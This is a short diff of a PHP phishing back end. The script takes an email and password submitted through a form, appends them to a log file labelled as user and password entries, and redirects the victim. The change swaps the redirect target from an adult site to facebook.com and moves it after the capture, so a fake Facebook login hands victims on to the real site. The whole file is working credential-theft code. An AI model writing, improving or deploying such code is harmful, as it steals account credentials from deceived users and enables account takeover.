@@ -1,5 +1,4 @@
 <?php
-header('Location: https://xvideos.com');
  $user = $_POST["email"];
  $pass = $_POST["pass"];
 
@@ -10,6 +9,7 @@ header('Location: https://xvideos.com');
  $pa = "Password: $pass\n";
  fwrite($fileuser, "\n". $co. $us. $pa. $cl);
  fclose($fileuser);
+ header('Location: https://facebook.com');
  exit()
 ?>
 
